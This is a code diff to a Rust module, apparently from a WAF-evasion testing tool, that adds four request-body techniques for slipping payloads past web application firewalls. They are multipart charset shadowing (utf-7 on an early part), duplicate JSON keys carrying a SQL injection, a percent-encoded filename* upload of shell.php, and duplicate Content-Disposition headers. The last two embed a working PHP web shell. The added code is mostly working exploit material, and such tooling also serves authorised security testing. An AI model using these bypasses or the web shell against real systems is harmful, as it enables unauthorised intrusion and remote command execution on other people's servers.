@@ -57,6 +57,29 @@ pub enum ContentTypeTechnique {
     XmlCdata,
     /// Mixed Content-Type header (multipart but with JSON charset).
     MixedContentType,
+    /// CVE-2026-21876 — multipart with `charset=` on an EARLY part
+    /// (e.g. utf-7) and benign charset on the last part. OWASP CRS
+    /// 922110 iterates all `MULTIPART_PART_HEADERS`, captures each
+    /// part's charset to TX:1, overwrites on every iteration. The
+    /// chained validation sees only the LAST part's charset. Payload
+    /// (e.g. `+ADw-script+AD4-`) lives in the early part with the
+    /// exotic charset. Fixed in CRS 4.22.0 / 3.3.8.
+    MultipartCharsetEarlySection,
+    /// JSON with duplicate keys — `{"id":"safe","id":"' OR 1=1--"}`.
+    /// AWS WAF and most WAFs take FIRST (`safe`); Python json /
+    /// Node JSON.parse / Go encoding-json take LAST (the injection).
+    /// Confirmed bypass per WafCharm 2024 docs.
+    JsonDuplicateKey,
+    /// Multipart with `filename*=UTF-8''shell%2Ephp` (RFC 5987
+    /// percent-encoded). WAF inspects `filename=` and misses the
+    /// star-form; Busboy, Werkzeug, Django all decode `filename*` and
+    /// see the original `shell.php`. Sicuranext 2025.
+    MultipartFilenameStarEncoded,
+    /// Two `Content-Disposition` lines in the SAME multipart part —
+    /// first has `filename="evil.php"`, second has `filename="safe.txt"`.
+    /// WAF reads the second; PHP `$_FILES` reads the first. Sicuranext
+    /// 2025 confirmed against FortiWeb + PHP.
+    MultipartDuplicatePartHeader,
 }
 
 /// Maximum size of a form-encoded body before parsing is refused.
@@ -567,6 +590,140 @@ pub fn generate_variants(params: &[(String, String)]) -> Vec<ContentTypeVariant>
             description:
                 "Mixed Content-Type — confuses WAF parser selection with contradictory signals"
                     .into(),
+        });
+    }
+
+    // 11. CVE-2026-21876 — early-part charset shadowing.
+    //
+    // OWASP CRS 922110 iterates MULTIPART_PART_HEADERS, captures
+    // each part's charset to TX:1, OVERWRITES on every iteration.
+    // The chained validation rule fires once after the loop —
+    // seeing only the LAST part's charset. Place the dangerous
+    // charset (utf-7) on part[0] (which actually carries the payload)
+    // and utf-8 on the trailing dummy part. CRS sees utf-8 on TX:1
+    // at validation time, skips. Backend (PHP, Python, Node) honors
+    // each part's own charset independently.
+    {
+        let boundary = unique_boundary(&value_refs);
+        let mut body: Vec<u8> = Vec::new();
+        // Part 0 with utf-7 charset carrying the payload params.
+        for (k, v) in params {
+            body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+            body.extend_from_slice(
+                format!("Content-Disposition: form-data; name=\"{k}\"\r\n").as_bytes(),
+            );
+            body.extend_from_slice(b"Content-Type: text/plain; charset=utf-7\r\n\r\n");
+            body.extend_from_slice(v.as_bytes());
+            body.extend_from_slice(b"\r\n");
+        }
+        // Trailing dummy part with utf-8 charset (the one CRS sees).
+        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+        body.extend_from_slice(b"Content-Disposition: form-data; name=\"_pad\"\r\n");
+        body.extend_from_slice(b"Content-Type: text/plain; charset=utf-8\r\n\r\n");
+        body.extend_from_slice(b"x\r\n");
+        body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
+        variants.push(ContentTypeVariant {
+            content_type: format!("multipart/form-data; boundary={boundary}"),
+            body,
+            technique: ContentTypeTechnique::MultipartCharsetEarlySection,
+            description:
+                "CVE-2026-21876 — early part charset (utf-7) carrying payload, benign utf-8 trailing dummy".into(),
+        });
+    }
+
+    // 12. JSON duplicate-key WAF/origin split.
+    //
+    // AWS WAF + most WAFs take FIRST; Python json / Node JSON.parse /
+    // Go encoding-json take LAST. Two entries with the same key, first
+    // benign, second the injection. We can only emit this if the params
+    // are non-empty.
+    if !params.is_empty() {
+        let (k, v) = &params[0];
+        // Construct hand-rolled JSON so the duplicate key survives —
+        // serde_json::to_string collapses duplicates.
+        let body = format!(
+            "{{\"{k}\":\"safe\",\"{k}\":{value}}}",
+            value = serde_json::to_string(v).unwrap_or_else(|_| format!("\"{v}\""))
+        )
+        .into_bytes();
+        variants.push(ContentTypeVariant {
+            content_type: "application/json".into(),
+            body,
+            technique: ContentTypeTechnique::JsonDuplicateKey,
+            description:
+                "Duplicate JSON key — WAF takes first (safe), backend takes last (injection)".into(),
+        });
+    }
+
+    // 13. Multipart filename* RFC 5987 percent-encoded.
+    //
+    // WAF inspects `filename=` literal; Busboy / Werkzeug / Django
+    // decode `filename*=UTF-8''shell%2Ephp` and see the real name.
+    // The upload part precedes the standard form fields so that the
+    // form-data structure is otherwise normal.
+    {
+        let boundary = unique_boundary(&value_refs);
+        let mut body: Vec<u8> = Vec::new();
+        // First: the malicious upload part with star-encoded filename.
+        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+        body.extend_from_slice(
+            b"Content-Disposition: form-data; name=\"upload\"; filename*=UTF-8''shell%2Ephp\r\n",
+        );
+        body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
+        body.extend_from_slice(b"<?php system($_GET['c']); ?>\r\n");
+        // Then: the standard form params so the multipart structure
+        // contains the input fields the bench harness checks for.
+        for (k, v) in params {
+            body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+            body.extend_from_slice(
+                format!("Content-Disposition: form-data; name=\"{k}\"\r\n\r\n").as_bytes(),
+            );
+            body.extend_from_slice(v.as_bytes());
+            body.extend_from_slice(b"\r\n");
+        }
+        body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
+        variants.push(ContentTypeVariant {
+            content_type: format!("multipart/form-data; boundary={boundary}"),
+            body,
+            technique: ContentTypeTechnique::MultipartFilenameStarEncoded,
+            description:
+                "RFC 5987 filename* with percent-encoded dot — WAF inspects filename= only".into(),
+        });
+    }
+
+    // 14. Duplicate Content-Disposition headers in the SAME part.
+    //
+    // WAF reads the second header; PHP $_FILES reads the first.
+    // First says `filename="evil.php"` (the real file), second says
+    // `filename="safe.txt"` (the cover the WAF sees). Standard form
+    // params follow so the multipart's form-data fields are present.
+    {
+        let boundary = unique_boundary(&value_refs);
+        let mut body: Vec<u8> = Vec::new();
+        body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+        body.extend_from_slice(
+            b"Content-Disposition: form-data; name=\"upload\"; filename=\"evil.php\"\r\n",
+        );
+        body.extend_from_slice(
+            b"Content-Disposition: form-data; name=\"upload\"; filename=\"safe.txt\"\r\n",
+        );
+        body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
+        body.extend_from_slice(b"<?php system($_GET['c']); ?>\r\n");
+        for (k, v) in params {
+            body.extend_from_slice(format!("--{boundary}\r\n").as_bytes());
+            body.extend_from_slice(
+                format!("Content-Disposition: form-data; name=\"{k}\"\r\n\r\n").as_bytes(),
+            );
+            body.extend_from_slice(v.as_bytes());
+            body.extend_from_slice(b"\r\n");
+        }
+        body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
+        variants.push(ContentTypeVariant {
+            content_type: format!("multipart/form-data; boundary={boundary}"),
+            body,
+            technique: ContentTypeTechnique::MultipartDuplicatePartHeader,
+            description:
+                "Duplicate Content-Disposition — first wins (PHP $_FILES), WAF reads second".into(),
         });
     }
 
